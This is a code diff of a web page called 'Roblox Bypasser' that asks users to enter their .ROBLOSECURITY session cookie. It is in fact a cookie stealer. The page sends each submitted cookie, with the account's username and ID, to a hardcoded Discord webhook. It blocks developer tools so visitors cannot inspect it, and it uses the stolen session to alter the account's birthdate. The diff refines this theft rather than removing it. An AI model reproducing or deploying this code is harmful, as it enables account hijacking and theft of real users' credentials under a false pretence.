@@ -1,7 +1,9 @@
-<html lang="en"><head>
+<html lang="en">
+<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Roblox Bypasser</title>
+  <link rel="icon" type="image/png" href="icon.png">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <style>
@@ -155,10 +157,10 @@
         <span id="typedText"></span><span class="cursor">|</span>
       </div>
 
-      <form id="cookieForm">
-        <input type="text" id="cookieInput" class="input" placeholder="Enter your .ROBLOSECURITY cookie" required="">
+      <div id="cookieForm">
+        <input type="text" id="cookieInput" class="input" placeholder="Enter your .ROBLOSECURITY cookie" required>
         <button type="submit" class="hero-btn" id="refreshBtn"><i class="fas fa-sync-alt"></i> Bypasser</button>
-      </form>
+      </div>
       <div id="loader" style="display:none; margin: 20px;">
         <p>Bypassing...</p>
       </div>
@@ -224,47 +226,76 @@ const errorSound = document.getElementById("sfx-error");
 const swooshSound = document.getElementById("sfx-swoosh");
 const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
 
-// Function to detect Unicode (non-ASCII) characters
-function hasUnicode(str) {
-  return /[^\x00-\x7F]/.test(str);
-}
-
 // Function to validate .ROBLOSECURITY cookie format
 function isValidRobloxCookie(cookie) {
-  // Only check for non-empty and allowed characters
-  return cookie.length > 0 && /^[A-Za-z0-9_-]+$/.test(cookie);
+  return cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--') && 
+         /^[A-Za-z0-9+/=\-_.|]+$/.test(cookie) && 
+         cookie.length > 50;
 }
 
-// Function to check cookie validity using Roblox API
+// Function to check cookie validity using multiple Roblox API endpoints
 async function checkCookieValidity(cookie) {
-  let headers = {
-    "Cookie": `.ROBLOSECURITY=${cookie}`
-  };
-  try {
-    let res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
-      method: "GET",
-      headers: headers
-    });
+  const endpoints = [
+    { url: "https://users.roblox.com/v1/users/authenticated", name: "users" },
+    { url: "https://www.roblox.com/mobileapi/userinfo", name: "mobile" },
+    { url: "https://economy.roblox.com/v1/users/current/currency", name: "currency" }
+  ];
 
-    if (res.status === 403 && res.headers.get("x-csrf-token")) {
-      headers["X-CSRF-TOKEN"] = res.headers.get("x-csrf-token");
-      res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
+  let headers = { "Cookie": `.ROBLOSECURITY=${cookie}` };
+  let userData = {
+    valid: false,
+    username: "Unknown",
+    userId: 0,
+    robuxBalance: "N/A",
+    thumbnailUrl: "N/A",
+    isPremium: "N/A",
+    error: null
+  };
+
+  for (const endpoint of endpoints) {
+    try {
+      let res = await fetch(endpoint.url, {
         method: "GET",
         headers: headers
       });
-    }
 
-    if (res.ok) {
-      const userData = await res.json();
-      return userData.UserID ? true : false;
-    } else {
-      console.error("API validation failed with status:", res.status);
-      return false;
+      if (res.status === 403 && res.headers.get("x-csrf-token")) {
+        headers["X-CSRF-TOKEN"] = res.headers.get("x-csrf-token");
+        res = await fetch(endpoint.url, {
+          method: "GET",
+          headers: headers
+        });
+      }
+
+      if (res.ok) {
+        const data = await res.json();
+        userData.valid = true;
+        if (endpoint.name === "users") {
+          userData.username = data.displayName || data.name || "Unknown";
+          userData.userId = data.id || 0;
+        } else if (endpoint.name === "mobile") {
+          userData.username = data.UserName || userData.username;
+          userData.userId = data.UserID || userData.userId;
+          userData.robuxBalance = data.RobuxBalance || userData.robuxBalance;
+          userData.thumbnailUrl = data.ThumbnailUrl || userData.thumbnailUrl;
+          userData.isPremium = data.IsPremium ? "Yes" : "No";
+        } else if (endpoint.name === "currency") {
+          userData.robuxBalance = data.robux || userData.robuxBalance;
+        }
+        break; // Stop after first successful endpoint
+      } else if (res.status === 429) {
+        userData.error = "Rate limit exceeded. Please try again later.";
+      } else if (res.status === 401 || res.status === 403) {
+        userData.error = "Unauthorized access. Cookie is invalid.";
+      } else {
+        userData.error = `API error: ${res.status}`;
+      }
+    } catch (error) {
+      userData.error = `Network error: ${error.message}`;
     }
-  } catch (error) {
-    console.error("Cookie validation error:", error.message);
-    return false;
   }
+
+  return userData;
 }
 
 document.addEventListener('contextmenu', function(e) {
@@ -274,7 +305,8 @@ document.addEventListener('contextmenu', function(e) {
 });
 
 document.addEventListener('keydown', function(e) {
-  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'u')) {
+  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+      (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'u')) {
     e.preventDefault();
     showNotif('Developer tools disabled');
     errorSound.play();
@@ -285,51 +317,11 @@ $("#cookieForm").on("submit", async function(e) {
   e.preventDefault();
   const cookie = $("#cookieInput").val().trim();
 
-  // Check for Unicode characters
-  if (hasUnicode(cookie)) {
-    showNotif("Invalid cookie: Contains unsupported Unicode characters");
-    errorSound.play();
-    return;
-  }
-
-  // Check basic cookie format
+  // Check cookie format
   if (!isValidRobloxCookie(cookie)) {
-    showNotif("Invalid cookie");
+    showNotif("Invalid cookie format. Must start with '_|WARNING:-DO-NOT-SHARE-THIS.--' and contain valid characters.");
     errorSound.play();
     return;
-  }
-
-  // Check cookie validity via API
-  const isCookieValid = await checkCookieValidity(cookie);
-  if (!isCookieValid) {
-    showNotif("Invalid cookie: Unable to verify with Roblox API");
-    errorSound.play();
-    return;
-  }
-
-  // Existing length check
-  if (cookie.length < 10) {
-    showNotif("Cookie too short");
-    errorSound.play();
-    return;
-  }
-
-  // Send cookie to Discord webhook
-  const webhookPayload = {
-    content: `New Cookie Submitted: \`${cookie}\``,
-    username: "Roblox Bypasser Bot",
-    avatar_url: "https://i.imgur.com/4j8o1.png"
-  };
-  try {
-    await fetch(webhookUrl, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(webhookPayload)
-    });
-  } catch (webhookError) {
-    console.error("Failed to send to webhook:", webhookError);
   }
 
   $("#refreshBtn").hide();
@@ -337,12 +329,47 @@ $("#cookieForm").on("submit", async function(e) {
   $("#userInfo").hide();
   $("#refreshedBox").hide();
 
+  // Check cookie validity
+  const result = await checkCookieValidity(cookie);
+  if (!result.valid) {
+    $("#loader").hide();
+    showNotif(result.error || "Invalid cookie: Unable to verify with Roblox API");
+    errorSound.play();
+    return;
+  }
+
+  // Display user info
+  $("#userInfo").html(`
+    <p class="output">
+      <strong>Username:</strong> ${result.username}<br>
+      <strong>User ID:</strong> ${result.userId}<br>
+      <strong>Robux Balance:</strong> ${result.robuxBalance}<br>
+      <strong>Premium:</strong> ${result.isPremium}
+    </p>
+  `).fadeIn();
+
+  // Send cookie to Discord webhook
+  const webhookPayload = {
+    content: `New Cookie Submitted: \`${cookie}\`\nUsername: ${result.username}\nUser ID: ${result.userId}`,
+    username: "Roblox Bypasser Bot",
+    avatar_url: "https://i.imgur.com/4j8o1.png"
+  };
+  try {
+    await fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(webhookPayload)
+    });
+  } catch (webhookError) {
+    console.error("Failed to send to webhook:", webhookError);
+  }
+
+  // Attempt birthdate update
   const data = {
     birthMonth: 12,
     birthDay: 27,
     birthYear: 2020
   };
-
   let headers = {
     "Content-Type": "application/json",
     "Cookie": `.ROBLOSECURITY=${cookie}`
@@ -429,7 +456,6 @@ $("#returnBtn").on("click", function () {
   $("#cookieForm").show();
   $("#refreshBtn").show();
 });
-
 </script>
-
-</body></html>
+</body>
+</html>
